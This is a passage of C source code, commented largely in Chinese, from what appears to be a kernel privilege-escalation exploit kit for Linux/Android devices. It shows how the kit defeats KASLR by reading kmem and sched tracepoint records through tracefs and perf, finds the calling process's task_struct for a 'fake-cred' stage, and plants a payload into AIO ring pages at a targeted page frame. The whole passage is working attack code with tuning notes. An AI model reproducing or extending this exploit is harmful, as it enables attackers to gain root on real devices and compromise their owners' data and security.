					 * 即 page@0, pfn@8, order@16, migratetype@20, gfp@24。）
					 * 不要再按「谁像小整数」猜。*/
					e->pfn = u64(b, p + OFF_PFN);
					e->order = u32(b, p + OFF_ORDER);
					cnt++;
				} else if (cnt < max && p + OFF_ALLOC + 8 <= end) {
					{
						/* 页记录优先：mm_page_alloc / mm_page_free 的第一个字
						 * 是 struct page *，页对齐（低 12 位为 0）；而
						 * kmem_cache_alloc 的第一个字是 call_site（内核 text
						 * 地址，低 12 位几乎不可能是 0）。第二个字是 pfn
						 * （小整数），第三个字是 order|migratetype。
						 * 这两条足以把页记录与 cache 记录分开，不靠猜。
						 * alloc 与 free 的形状相同，用记录长度区分：
						 * alloc 带 gfp_flags 指针，整条更长。*/
						uint64_t w0 = u64(b, p);
						uint64_t w1 = u64(b, p + 8);

						if (w0 && (w0 & 0xfffULL) == 0 &&
						    w0 >= 0xffff000000000000ULL &&
						    w1 && w1 < (1ULL << 40)) {
							struct ev *e = &out[cnt];

							memset(e, 0, sizeof(*e));
							e->id = type;
							e->pid = (int)u32(b, p + 4);
							e->pfn = w1;
							e->order = u32(b, p + 16);
							e->type = (total >= 32) ?
								EV_PAGE_ALLOC : EV_PAGE_FREE;
							cnt++;
							goto next;
						}
					}
					/* id 不认识：按记录形状兜底分类。
					 * 有的内核 kmem 事件 id 与我们编的常量不一致，
					 * 之前它们被静默丢掉，表现为 timer_allocs=0。*/
					struct ev *e = &out[cnt];

					e->id = type;
					e->pid = (int)u32(b, p + 4);
					e->site = u64(b, p + OFF_SITE);
					e->ptr = u64(b, p + OFF_PTR);
					e->req = u64(b, p + OFF_REQ);
					e->alloc = u64(b, p + OFF_ALLOC);
					if (p + OFF_ORDER + 4 <= end) {
						e->pfn = u64(b, p + OFF_PFN);
						e->order = u32(b, p + OFF_ORDER);
					}
					if (!e->req && !e->alloc && e->ptr)
						e->type = EV_CACHE_FREE;
					else if (e->req && e->req == e->alloc &&
					    e->req <= 0x4000)
						e->type = EV_CACHE_ALLOC;
					else if (e->order <= 10 && e->pfn)
						e->type = EV_PAGE_ALLOC;
					else
						e->type = 0xFFFFu;
					cnt++;
				}
			}
next:
			o += total;
		}
	}
	return cnt;
}

/* Slurp every per-CPU ring into g_raw and parse it. */

/* ---------------- perf tracepoint 通道 ----------------
 * 与 MagicRoot 的 cred_target 同一路数：
 *   id = /sys/kernel/tracing/events/kmem/<ev>/id      （0444，不需要写权限）
 *   perf_event_open(PERF_TYPE_TRACEPOINT, config=id)  → mmap ring
 * 拿到的 PERF_RECORD_SAMPLE 里 PERF_SAMPLE_RAW 就是 trace_entry 原文，
 * 与 trace_pipe_raw 的记录体逐字节相同，于是把样本重新装箱成
 * 「ftrace raw 页」结构交给 parse_events()，下游判据一行都不用改。*/

static int perf_id_of(const char *name)
{
	char path[192];
	char buf[32];
	int fd;
	int n;

	snprintf(path, sizeof(path), TR "/events/kmem/%s/id", name);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	n = (int)read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return -1;
	buf[n] = 0;
	return atoi(buf);
}

static int perf_open_one(int id, int cpu)
{
	struct perf_event_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_TRACEPOINT;
	attr.size = sizeof(attr);
	attr.config = (uint64_t)id;
	attr.sample_period = 1;
	attr.sample_type = PERF_SAMPLE_RAW;
	attr.wakeup_events = 1;
	attr.disabled = 0;
	attr.exclude_hv = 1;
	return (int)syscall(__NR_perf_event_open, &attr, -1, cpu, -1, 0);
}

/* 把样本装箱成 ftrace raw 页：每页 [u64 time][u64 commit][记录...]，
 * 记录 = [u32 hdr(type_len=0,delta=0)][u32 payload_len][payload]。*/
struct pbuf {
	unsigned char *b;
	size_t cap;
	size_t page;	/* 当前页起始偏移 */
	size_t used;	/* 当前页已写记录字节（不含 16 字节头） */
	size_t total;	/* 已装箱的记录数 */
	size_t last_len;
};

static void pbuf_init(struct pbuf *p, unsigned char *b, size_t cap)
{
	memset(p, 0, sizeof(*p));
	p->b = b;
	p->cap = cap;
	memset(b, 0, cap < PAGE ? cap : PAGE);
}

static int pbuf_add(struct pbuf *p, const unsigned char *rec, size_t len)
{
	size_t need = 8 + len;
	size_t pos = p->page + 16 + p->used;

	if (len < 8 || len > 4096)
		return 0;
	if (pos + need > p->page + PAGE) {
		/* 结页，开新页 */
		uint64_t commit = (uint64_t)p->used;

		memcpy(p->b + p->page + 8, &commit, 8);
		p->page += PAGE;
		p->used = 0;
		if (p->page + PAGE > p->cap)
			return 0;
		memset(p->b + p->page, 0, PAGE);
		pos = p->page + 16;
	}
	{
		uint32_t h0 = 0, h1 = (uint32_t)len;
		memcpy(p->b + pos, &h0, 4);
		memcpy(p->b + pos + 4, &h1, 4);
	}
	memcpy(p->b + pos + 8, rec, len);
	p->used += need;
	p->last_len = len;
	p->total++;
	return 1;
}

static size_t pbuf_finish(struct pbuf *p)
{
	uint64_t commit = (uint64_t)p->used;
	size_t end = (p->page + 16 + p->used + PAGE - 1) / PAGE * PAGE;

	memcpy(p->b + p->page + 8, &commit, 8);
	return end > p->cap ? p->cap : end;
}

static size_t perf_drain_fd(int fd, struct pbuf *pb)
{
	long pg = sysconf(_SC_PAGESIZE);
	size_t ring = (size_t)pg * 3;	/* 1 meta + 2 data */
	unsigned char *m;
	size_t got = 0;

	if (pg <= 0)
		return 0;
	m = mmap(NULL, ring, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (m == MAP_FAILED)
		return 0;
	{
		struct perf_event_mmap_page *mp = (struct perf_event_mmap_page *)m;
		unsigned char *data = m + pg;
		size_t dsz = (size_t)pg * 2;
		uint64_t head = mp->data_head;
		uint64_t tail = mp->data_tail;

		__sync_synchronize();
		while (tail < head) {
			size_t off = (size_t)(tail % dsz);
			struct perf_event_header hdr;
			size_t avail = (size_t)(head - tail);

			if (avail < sizeof(hdr))
				break;
			if (off + sizeof(hdr) > dsz) {
				/* 回绕：拷贝头部到临时区 */
				unsigned char tmp[sizeof(hdr)];
				size_t first = dsz - off;

				memcpy(tmp, data + off, first);
				memcpy(tmp + first, data, sizeof(hdr) - first);
				memcpy(&hdr, tmp, sizeof(hdr));
			} else {
				memcpy(&hdr, data + off, sizeof(hdr));
			}
			if (!hdr.size || hdr.size > avail)
				break;
			if (hdr.type == PERF_RECORD_SAMPLE && hdr.size > 12) {
				unsigned char samp[4096];
				size_t n = hdr.size < sizeof(samp) ? hdr.size :
					   sizeof(samp);
				size_t first = dsz - off;
				uint32_t rawsz;

				if (first >= n)
					memcpy(samp, data + off, n);
				else {
					memcpy(samp, data + off, first);
					memcpy(samp + first, data, n - first);
				}
				/* sample_type 只有 PERF_SAMPLE_RAW：header 之后
				 * 是 u32 size，再后面就是 trace_entry 原文。*/
				memcpy(&rawsz, samp + sizeof(hdr), 4);
				if (rawsz >= 8 && sizeof(hdr) + 4 + rawsz <= n) {
					if (pbuf_add(pb, samp + sizeof(hdr) + 4,
						     rawsz))
						got++;
				}
			}
			tail += hdr.size;
		}
		mp->data_tail = head;
	}
	munmap(m, ring);
	return got;
}

static long perf_collect(unsigned char *out, size_t cap)
{
	static const char *names[] = {
		"kmem_cache_alloc", "kmem_cache_alloc_node",
		"kmem_cache_free", "mm_page_alloc", "mm_page_free",
		"mm_page_alloc_extfrag", "mm_page_pcpu_drain"
	};
	int ids[8];
	int nid = 0;
	struct pbuf pb;
	int ncpu = g_ncpu > 0 ? g_ncpu : 8;
	size_t frames = 0;

	for (size_t i = 0; i < sizeof(names) / sizeof(names[0]) &&
			   nid < (int)(sizeof(ids) / sizeof(ids[0])); i++) {
		int id = perf_id_of(names[i]);

		if (id > 0)
			ids[nid++] = id;
	}
	if (!nid) {
		logf("[perf] no kmem event id (%s)\n", TR);
		return 0;
	}
	pbuf_init(&pb, out, cap);
	for (int i = 0; i < nid; i++) {
		for (int c = 0; c < ncpu; c++) {
			int fd = perf_open_one(ids[i], c);

			if (fd < 0) {
				if (i == 0 && c == 0)
					logf("[perf] perf_event_open errno=%d\n", errno);
				continue;
			}
			frames += perf_drain_fd(fd, &pb);
			close(fd);
		}
	}
	if (!frames) {
		logf("[perf] ids=%d samples=0\n", nid);
		return 0;
	}
	logf("[perf] ids=%d samples=%zu (no tracefs enable)\n", nid, frames);
	return (long)pbuf_finish(&pb);
}

static int harvest(struct ev *evs, int max)
{
	size_t total = 0;

	if (g_lay_n < 0) {
		int n = lay_build(TR);

		if (n > 0) {
			logf("[lay] format events=%d\n", n);
			for (int i = 0; i < n && i < 8; i++)
				logf("[lay] %s id=%u kind=%d site=%d ptr=%d req=%d "
				     "alloc=%d pfn=%d order=%d\n", g_lay[i].name,
				     g_lay[i].id, g_lay[i].kind,
				     g_lay[i].f.has_site ? g_lay[i].f.site : -1,
				     g_lay[i].f.has_ptr ? g_lay[i].f.ptr : -1,
				     g_lay[i].f.has_req ? g_lay[i].f.req : -1,
				     g_lay[i].f.has_alloc ? g_lay[i].f.alloc : -1,
				     g_lay[i].f.has_pfn ? g_lay[i].f.pfn : -1,
				     g_lay[i].f.has_order ? g_lay[i].f.order : -1);
		} else {
			/* format 读不到：不猜固定偏移，交给字节嗅探。
			 * TIMER_SITE_LOW21 为 0（offsets-only）时嗅探无从比对，
			 * 仍退回旧的固定偏移路径。*/
			if (TIMER_SITE_LOW21) {
				g_lay_n = -2;
				logf("[lay] no events/kmem/*/format; byte sniff (want low21=%#llx)\n",
				     (unsigned long long)TIMER_SITE_LOW21);
			} else {
				logf("[lay] no events/kmem/*/format; fixed offsets\n");
			}
		}
	}
#if EXTRACTKIT_PERF_FIRST
	{
		long pn = perf_collect(g_raw, g_raw_cap);

		if (pn > 0) {
			int k = parse_events(g_raw, (size_t)pn, evs, max);

			if (k > 0)
				return k;
			logf("[perf] packed %ld bytes but no events; fallback tracefs\n",
			     pn);
		}
	}
#endif
	for (int c = 0; c < 8 && total < g_raw_cap; c++) {
		long n = read_cpu(c, g_raw + total, g_raw_cap - total);

		if (n > 0)
			total += (size_t)n;
	}
#if !EXTRACTKIT_PERF_FIRST
	if (!total) {
		long pn = perf_collect(g_raw, g_raw_cap);

		if (pn > 0) {
			int k = parse_events(g_raw, (size_t)pn, evs, max);

			if (k > 0)
				return k;
		}
	}
#endif
	if (!total)
		return 0;
	return parse_events(g_raw, total, evs, max);
}

static int is_kernel_ptr(uint64_t v) { return (v >> 48) == 0xffff; }

/* task_struct_cachep allocation by copy_process() in our own pid: the trace
 * record identifies both the pointer and the call site, so the fake-cred
 * stage can find `current`'s task_struct without any kallsyms access. */
static uint64_t scan_task_allocs(struct ev *evs, int n, int pid)
{
	uint64_t out = 0;
	/* 优先用 cfg 的 taskSize；如果内核实际 objsize 与之不同（被对齐或改过），
	 * 用 /proc/slabinfo 读到的值兜底扫一遍，避免 task=0 直接 park。*/
	uint64_t want = (uint64_t)TASK_ALLOC_BYTES;

	for (int i = 0; i < n; i++) {
		if (evs[i].type != EV_CACHE_ALLOC || evs[i].pid != pid)
			continue;
		if (!LOW21_EQ((evs[i].site & 0x1fffff), TASK_ALLOC_LOW21)) {
			if (!g_site_soft)
				continue;
			if (!g_site_fallback_logged) {
				g_site_fallback_logged = 1;
				logf("[!] task site %#llx != %#llx; soft match by size %#llx\n",
				     (unsigned long long)(evs[i].site & 0x1fffff),
				     (unsigned long long)TASK_ALLOC_LOW21,
				     (unsigned long long)TASK_ALLOC_BYTES);
			}
		}
		/* 内核 slab 的实际 objsize 可能被对齐/改过（HAPT 也是现场读
		 * /proc/slabinfo 校正），cfg 里的值只作首选。*/
		if (!((uint64_t)evs[i].req == want && (uint64_t)evs[i].alloc == want) &&
		    !((uint64_t)evs[i].req >= want && (uint64_t)evs[i].req <= want + 0x400 &&
		      (uint64_t)evs[i].alloc >= (uint64_t)evs[i].req &&
		      (uint64_t)evs[i].alloc <= want + 0x400))
			continue;
		if (!is_kernel_ptr(evs[i].ptr))
			continue;
		out = evs[i].ptr;
	}
	/* cfg 的 taskSize 没命中，而 slabinfo 给出了另一个值：按它再扫一遍。*/
	if (!out && g_task_obj && g_task_obj != want) {
		logf("[slab] task_struct objsize=%#llx (cfg %#llx), using live value\n",
		     (unsigned long long)g_task_obj,
		     (unsigned long long)TASK_ALLOC_BYTES);
		for (int i = 0; i < n; i++) {
			if (evs[i].type != EV_CACHE_ALLOC || evs[i].pid != pid)
				continue;
			if ((uint64_t)evs[i].req != g_task_obj ||
			    (uint64_t)evs[i].alloc != g_task_obj)
				continue;
			if (!is_kernel_ptr(evs[i].ptr))
				continue;
			out = evs[i].ptr;
		}
	}
	/* 兜底：copy_process 的记录有时挂在子/父进程不同 pid 上，
	 * 放宽 pid，但要求尺寸落窗口且指针是内核地址。*/
	if (!out) {
		for (int i = 0; i < n; i++) {
			uint64_t rq, al;
			if (evs[i].type != EV_CACHE_ALLOC)
				continue;
			rq = (uint64_t)evs[i].req;
			al = (uint64_t)evs[i].alloc;
			if (rq < want || rq > want + 0x400)
				continue;
			if (al < rq || al > want + 0x400)
				continue;
			if (!is_kernel_ptr(evs[i].ptr))
				continue;
			out = evs[i].ptr;
			logf("[task-scan] any-pid fallback ptr=%#llx req=%#llx alloc=%#llx pid=%d (want %d)\n",
			     (unsigned long long)out, (unsigned long long)rq,
			     (unsigned long long)al, evs[i].pid, pid);
			break;
		}
		if (!out)
			logf("[task-scan] no match (want=%#llx pid=%d n=%d)\n",
			     (unsigned long long)want, pid, n);
	}
	return out;
}


/* Touch and drop 32 MiB of anon memory so the buddy allocator issues a few
 * order-1 allocations; calibrate_base() needs them to pair slab pointers with
 * pfns. */
static void prime_allocator(void)
{
	size_t n = 32u << 20;
	char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if (p == MAP_FAILED)
		return;
	for (size_t i = 0; i < n; i += PAGE)
		p[i] = 1;
	munmap(p, n);
}

/* Pair order-1 page allocs with posix_timers_cache allocs to recover the
 * direct-map base.  Both carry slide-independent low bits, so a single pass
 * with a vote is enough. */
/* 直映射基址与 text slide 是两件事：KASLR 只搬内核镜像，线性映射区
 * 由 VA_BITS 决定（48 位 = 0xffffff8000000000，52 位 = 0xfff0000000000000）。
 * 用记录里的 slab 指针反推：phys 合理（< 256 GiB）的那个就是。*/
static uint64_t direct_base_from(const struct ev *evs, int cnt)
{
	for (int i = 0; i < cnt; i++) {
		uint64_t q = evs[i].ptr, b;

		if (evs[i].type != EV_CACHE_ALLOC || !q)
			continue;
		if ((q >> 40) != 0xffffffULL)
			continue;
		b = 0xffffff8000000000ULL;
		if (q >= b && ((q - b) >> 38) == 0)
			return b;
		b = 0xfff0000000000000ULL;
		if (q >= b && ((q - b) >> 38) == 0)
			return b;
	}
	return 0;
}

#ifndef EXTRACTKIT_COLSCAN
#define EXTRACTKIT_COLSCAN 0
#endif
#ifndef EXTRACTKIT_WINDOW_EXACTV
#define EXTRACTKIT_WINDOW_EXACTV 0
#endif
#ifndef EXTRACTKIT_BASE_FALLBACK
#define EXTRACTKIT_BASE_FALLBACK 1
#endif


/* 与 libsysopt.so:0x40251c 相同的读法：open("/proc/self/pagemap") + pread 8B
 * at (va>>12)*8，返回 entry & 0x1FFFFFFFF（内核在没有 CAP_SYS_ADMIN 时把 PFN 清零，
 * 此时返回 0 —— 调用方必须把 0 当成「拿不到 pfn」而不是「pfn=0 命中」）。 */
/* 6.1 家族完全按参考实现（gaaa）的策略：窗口只认页级 pfn，
 * stream 未命中就直接 pipe/AIO reclaim，不用我们自造的 ptr==V /
 * cache_free 两个替代信号。其余家族保持原样。*/
static int fam_is_61(void)
{
	static int v = -1;

	if (v < 0)
		v = (strcmp(EXTRACTKIT_FAMILY_ID, "6.1") == 0);
	return v;
}

static uint64_t pagemap_pfn(const void *va)
{
	uint64_t e = 0;
	int fd = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 0;
	if (pread(fd, &e, sizeof(e), (off_t)((((uintptr_t)va) >> 12) * 8ULL)) !=
	    (ssize_t)sizeof(e))
		e = 0;
	close(fd);
	return e & 0x1FFFFFFFFULL;
}

#if EXTRACTKIT_AIO_PLANT
/* 扫 /proc/self/maps 里新增的、可写、无名的匿名映射（io_setup 的 ring 页），
 * 按页内偏移写入 payload。写坏也只坏我们自己的 ring，不会碰别人的对象。 */
static int aio_plant(const unsigned char *payload, size_t len, unsigned long off,
                     uint64_t want_pfn)
{
	void *ctxs[EXTRACTKIT_AIO_RINGS];
	int nrings = 0, written = 0;
	static unsigned char maps[1 << 20];
	int fd, n;
	char line[512];
	size_t pos = 0;

	for (int i = 0; i < EXTRACTKIT_AIO_RINGS; i++) {
		void *c = NULL;
		if (syscall(__NR_io_setup, 128, &c) != 0)
			break;
		ctxs[nrings++] = c;
	}
	if (!nrings) {
		logf("[aio] io_setup failed (errno=%d)\n", errno);
		return 0;
	}
	fd = open("/proc/self/maps", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 0;
	n = (int)read(fd, maps, sizeof(maps) - 1);
	close(fd);
	if (n <= 0)
		return 0;
	maps[n] = 0;

	while (pos < (size_t)n && written < nrings) {
		size_t e = pos;
		while (e < (size_t)n && maps[e] != '\n')
			e++;
		size_t ll = e - pos;
		if (ll > 0 && ll < sizeof(line)) {
			memcpy(line, maps + pos, ll);
			line[ll] = 0;
			unsigned long lo = 0, hi = 0;
			char perms[8] = {0};
			if (sscanf(line, "%lx-%lx %7s", &lo, &hi, perms) == 3) {
				/* 只看可写匿名页（io_setup 的 ring 是 rw-s 或 rw-p、无路径） */
				if ((hi - lo) >= 0x1000 && perms[0] == 'r' && perms[1] == 'w' &&
				    !strchr(line, '/') && (size_t)(hi - lo) <= (1u << 20)) {
					unsigned char *p = (unsigned char *)lo + off;
					size_t room = (hi - lo) > off ? (hi - lo) - off : 0;
					if (room >= len) {
						uint64_t mp = pagemap_pfn(p);
						if (!mp) {
							logf("[aio] no pfn (pagemap zeroed); skip write\n");
							continue;
						}
						if (want_pfn && mp != want_pfn &&
						    mp != (want_pfn | 1ULL)) {
							logf("[aio] pfn mismatch %#llx != %#llx; skip write\n",
							     (unsigned long long)mp,
							     (unsigned long long)want_pfn);
							continue;
						}
						memcpy(p, payload, len);
						__sync_synchronize();
						if (memcmp(p, payload, len) != 0) {
							logf("[aio] readback mismatch; miss\n");
							continue;
						}
						written++;
					}
				}
			}
		}
		pos = e + 1;
	}
	logf("[aio] rings=%d planted=%d off=%#lx target=%d want_pfn=%#llx\n",
	     nrings, written, off, (int)len, (unsigned long long)want_pfn);
	return written;
}
#endif


#if EXTRACTKIT_SCHED_SLIDE
/* 与 MagicRoot 的 kaslr_slide_* 同策略：
 * 1) 打开 sched/sched_blocked_reason（sched 事件，不是 kmem）
 * 2) 读 trace 文本里的 "caller=<sym>+0x<off>/0x<size>" 定位锚点运行时地址
 * 3) 读 8 核 trace_pipe_raw，扫内核指针，减锚点得 slide 候选
 * 4) 2 MiB 对齐 + 票数门限（votes>=3 / anchors>=2 / bytes>=1 MiB） */
struct ka_anchor { const char *name; uint64_t link; };

/* 锚点顺序固定：cfg 里的 anchors[0..6] 与这张名字表一一对应。
 * 一台机标定一次就能用；没有 cfg 锚点时退回下面这份编译期默认（仅 BSN-AN00 那颗）。*/
static const char *const g_ka_names[] = {
	"pick_next_task_fair",
	"__schedule",
	"finish_task_switch",
	"try_to_wake_up",
	"worker_thread",
	"rcu_gp_kthread",
	"wake_up_new_task",
};
#define KA_N ((int)(sizeof(g_ka_names) / sizeof(g_ka_names[0])))

static struct ka_anchor g_ka_anchors[KA_N] = {
	{"pick_next_task_fair", 0xffffffc0800e84ccULL},
	{"rcu_gp_kthread",      0xffffffc08017c904ULL},
	{"worker_thread",       0xffffffc08020637cULL},
};

static int g_ka_n = 3;

/* 有 device.cfg 的锚点就用它（名字按 g_ka_names 顺序），否则保留编译期默认。*/
static void ka_prepare(void)
{
	if (g_cfg.anchor_count < 2)
		return;
	g_ka_n = 0;
	for (int i = 0; i < KA_N && i < (int)g_cfg.anchor_count; i++) {
		if (!g_cfg.anchors[i])
			continue;
		g_ka_anchors[g_ka_n].name = g_ka_names[i];
		g_ka_anchors[g_ka_n].link = g_cfg.anchors[i];
		g_ka_n++;
	}
	if (g_ka_n < 2) {
		/* 锚点不够就当没有，别拿半张表去投票 */
		g_ka_n = 0;
		logf("[sched] cfg anchors=%d; skip sched channel\n", g_ka_n);
	} else {
		logf("[sched] using %d cfg anchors\n", g_ka_n);
	}
}

static int ka_is_text(uint64_t v)
{
	return v >= 0xffffff8000000000ULL && v < 0xffffffd000000000ULL;
}

static int sched_slide_leak(uint64_t *out)
{
	static unsigned char txt[1 << 20];
	static unsigned char raw[6 << 20];
	long tn, rn;
	int fd, votes = 0, anchors = 0, need = 3;
	uint64_t best = 0;

	if (wr(TR "/events/sched/sched_blocked_reason/enable", "1") != 0) {
		logf("[sched] enable failed (errno=%d); fallback kmem\n", errno);
		return 0;
	}
	fd = open(TR "/trace", O_RDONLY | O_CLOEXEC);
	if (fd < 0) { logf("[sched] cannot open trace\n"); return 0; }
	tn = read(fd, txt, sizeof(txt) - 1);
	close(fd);
	if (tn <= 0) { logf("[sched] trace empty\n"); return 0; }
	txt[tn] = 0;

	ka_prepare();
	uint64_t anchor_rt[KA_N];
	for (int i = 0; i < KA_N; i++)
		anchor_rt[i] = 0;

	for (long i = 0; i + 8 < tn; i++) {
		if (memcmp(txt + i, "caller=", 7) != 0)
			continue;
		char name[64];
		size_t k = 0;
		long p = i + 7;
		while (p < tn && txt[p] != '+' && txt[p] != '/' && txt[p] != '\n' && k + 1 < sizeof(name))
			name[k++] = (char)txt[p++];
		name[k] = 0;
		unsigned long long off = 0;
		if (p < tn && txt[p] == '+')
			(void)sscanf((const char *)txt + p + 1, "%llx", &off);
		for (int a = 0; a < g_ka_n; a++) {
			if (!g_ka_anchors[a].name || strcmp(name, g_ka_anchors[a].name) != 0)
				continue;
			anchor_rt[a] = g_ka_anchors[a].link + off;
			anchors++;
		}
		if (anchors >= 6)
			break;
	}
	if (!anchors) {
		logf("[sched] no usable anchors in text; fallback kmem\n");
		return 0;
	}

	rn = read_all_cpus(raw, sizeof(raw));
	if (rn < (1L << 20)) {
		logf("[sched] raw too small (%ld B < 1 MiB); fallback kmem\n", rn);
		return 0;
	}

	for (long o = 0; o + 8 <= rn; o += 8) {
		uint64_t ip = u64(raw, (size_t)o);
		if (!ka_is_text(ip))
			continue;
		for (int a = 0; a < g_ka_n; a++) {
			uint64_t sl;
			if (!anchor_rt[a] || ip < anchor_rt[a])
				continue;
			sl = ip - anchor_rt[a];
			if (sl & 0x1fffffULL)
				continue;
			if (sl > (1ULL << 38))
				continue;
			/* 简易多数票：同一 slide 出现即累加，best 记住最高票 */
			if (!votes || sl == best) {
				best = sl; votes++;
			} else {
				votes--;
			}
		}
	}
	(void)need;
	if (votes < 3 || anchors < 2) {
		logf("[sched] low votes=%d anchors=%d bytes=%ld; fallback kmem\n",
		     votes, anchors, rn);
		return 0;
	}
	logf("[sched] slide=%#llx votes=%d anchors=%d bytes=%ld\n",
	     (unsigned long long)best, votes, anchors, rn);
	*out = best;
	return 1;
}
#endif

static uint64_t calibrate_base(struct ev *evs)
{
	uint64_t hist[64] = { 0 };
	int hist_n[64] = { 0 };
	uint64_t recent[32] = { 0 };
	int rn = 0, hc = 0, best = 0, best_n = 0, cnt;
	uint64_t best_base = 0;
	struct sigevent ev;

	prime_allocator();
	trace_start();
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < 512; i++) {
		timer_t t;

		if (timer_create(CLOCK_MONOTONIC, &ev, &t))
			break;
	}
	usleep(20000);
	trace_stop();
	cnt = harvest(evs, 600000);
	{
		int n1 = 0, nt = 0;

		for (int i = 0; i < cnt; i++) {
			if (evs[i].type == EV_PAGE_ALLOC && evs[i].order == 1)
				n1++;
			if (evs[i].type == EV_CACHE_ALLOC &&
			    (TIMER_OBJ == 0 || (evs[i].req == TIMER_OBJ && evs[i].alloc == TIMER_OBJ)))
				nt++;
		}
		logf("[base] recs=%d order1_pages=%d timer_allocs=%d\n", cnt, n1,
		     nt);
		/* 诊断：id 是内核给的，SELinux 挡了 id 文件时只能靠样本反推 */
		{
			int nsamp = cnt < 8 ? cnt : 8;

			for (int i = 0; i < nsamp; i++)
				logf("[base] sample ev=%d id=%d req=%#llx alloc=%#llx order=%d\n",
				     (int)evs[i].type, (int)evs[i].id,
				     (unsigned long long)evs[i].req,
				     (unsigned long long)evs[i].alloc,
				     (int)evs[i].order);
		}
		/* 诊断：把缓存分配按对象大小分组，能一眼看出 itimer 尺寸是否对不上 */
		{
			uint64_t sz[6] = { 0 };
			int sc[6] = { 0 }, ns = 0;

			for (int i = 0; i < cnt; i++) {
				int f = 0;

				if (evs[i].type != EV_CACHE_ALLOC)
					continue;
				for (int k = 0; k < ns; k++)
					if (sz[k] == evs[i].req) {
						sc[k]++;
						f = 1;
						break;
					}
				if (!f && ns < 6) {
					sz[ns] = evs[i].req;
					sc[ns] = 1;
					ns++;
				}
			}
			logf("[base] cache sizes:");
			for (int k = 0; k < ns; k++)
				logf(" %#llx x%d", (unsigned long long)sz[k], sc[k]);
			logf("\n");
		}
	}

/* BASE_LEGACY=1 时不做 call_site 反推，完全用我们那台已跑通的
 * 旧路径（order-1 页 + slab 页配对全量投票），用于对照。*/
#ifndef BASE_LEGACY
#define BASE_LEGACY 0
#endif

	/* 列扫描：用「多条样本里这一列恒定」这一条硬判据定位 call_site。
	 * 单条记录的低 21 位匹配会骗人（见 8.88 的 site=0xffffffec…），
	 * 但噪声列不可能在几百条样本里完全一致。*/
	if (!BASE_LEGACY && STATIC_TIMER_SITE && TIMER_SITE_LOW21 &&
	    g_lay_raw_n >= 4) {
		int col = -1;
		int szc = -1;
		uint64_t val = 0;

		if (lay_scan_columns((uint64_t)TIMER_SITE_LOW21, &col, &val, &szc)) {
			uint64_t slide = val - STATIC_TIMER_SITE;
			uint64_t b2 = direct_base_from(evs, cnt);

			logf("[base] colscan col=%d value=%#llx n=%d slide=%lld\n",
			     col, (unsigned long long)val, g_lay_raw_n,
			     (long long)slide);
			if (!(slide & 0x1fffffULL) &&
			    slide + (1ULL << 38) <= (1ULL << 39) &&
			    b2 >= 0xffffff8000000000ULL &&
			    b2 < 0xffffffd000000000ULL) {
				logf("[base] via column best=%#llx\n",
				     (unsigned long long)b2);
				return b2;
			}
			logf("[base] colscan hit rejected: implausible slide\n");
		} else {
			logf("[base] colscan no constant low21 match (n=%d)\n",
			     g_lay_raw_n);
		}
	}

	/* 首选：用记录里的 call_site 直接反推 slide。
	 * call_site = do_timer_create + timerSiteOffset + slide，而
	 * STATIC_TIMER_SITE 存的正是「符号地址 + 偏移」，所以
	 * slide = site - STATIC_TIMER_SITE，且必须 2 MiB 对齐。
	 * 这条路不依赖「slab 页与 order-1 页相邻」，5.10/6.1/6.12 都成立。*/
	if (!BASE_LEGACY && STATIC_TIMER_SITE && TIMER_SITE_LOW21) {
		for (int i = 0; i < cnt; i++) {
			uint64_t site = evs[i].site, slide, base;
			int f = 0;

			if (evs[i].type != EV_CACHE_ALLOC || !site)
				continue;
			if ((site & 0x1fffffULL) != (uint64_t)TIMER_SITE_LOW21)
				continue;
			slide = site - STATIC_TIMER_SITE;
			if (slide & 0x1fffffULL)
				continue;
			/* 真 slide 不可能超过 2 GiB：超出说明 site 字段读错了
			 * （5.10 记录里字段不按 6.x 排列，高位是垃圾），丢弃。*/
			if (slide + (1ULL << 38) > (1ULL << 39))
				continue;
			/* slide 可能为负（镜像被放到链接地址之下），所以
			 * 下界放宽到 0xffffff8000000000，仍要求 2 MiB 对齐。*/
			base = direct_base_from(evs, cnt);
			if (!base)
				continue;
			if (base < 0xffffff8000000000ULL ||
			    base >= 0xffffffd000000000ULL)
				continue;
			for (int k = 0; k < hc; k++)
				if (hist[k] == base) {
					hist_n[k]++;
					f = 1;
					break;
				}
			if (!f && hc < 64) {
				hist[hc] = base;
				hist_n[hc] = 1;
				hc++;
			}
		}
		if (hc) {
			best = 0;
			for (int k = 1; k < hc; k++)
				if (hist_n[k] > hist_n[best])
					best = k;
			/* 严格一致：只有「全部有效样本给出同一个 base」才采用。
			 * 票数制会放过「362 票但未对齐」这类假 READY，正是 AAK 事故成因。*/
			if (hc == 1 && hist_n[best] >= 4) {
				logf("[base] via call_site samples=%d base=%#llx (all samples agree)\n",
				     hist_n[best], (unsigned long long)hist[best]);
				return hist[best];
			}
			if (hc > 1) {
				logf("[base] unstable across %d samples:", hc);
				for (int k = 0; k < hc && k < 4; k++)
					logf(" %#llx x%d",
					     (unsigned long long)hist[k], hist_n[k]);
				logf(" -> refuse (need one single base from every sample)\n");
				return 0;
			}
			logf("[base] call_site samples=%d (<4) -> refuse\n", hist_n[best]);
			return 0;
		} else {
			/* 一条都没命中：把出现最多的几个 low21 打出来，
			 * 一眼区分「TIMER_SITE_LOW21 期望值错了」还是
			 * 「kmem_cache_alloc 记录根本没进来」。*/
			uint64_t top[3] = { 0 };
			int top_n[3] = { 0 };

			for (int i = 0; i < cnt; i++) {
				uint64_t l;
				int k, hit = 0;

				if (evs[i].type != EV_CACHE_ALLOC || !evs[i].site)
					continue;
				l = evs[i].site & 0x1fffffULL;
				for (k = 0; k < 3; k++)
					if (top_n[k] && top[k] == l) {
						top_n[k]++;
						hit = 1;
						break;
					}
				if (hit)
					continue;
				for (k = 0; k < 3; k++)
					if (!top_n[k]) {
						top[k] = l;
						top_n[k] = 1;
						hit = 1;
						break;
					}
				if (!hit) {
					int m = 0;

					for (k = 1; k < 3; k++)
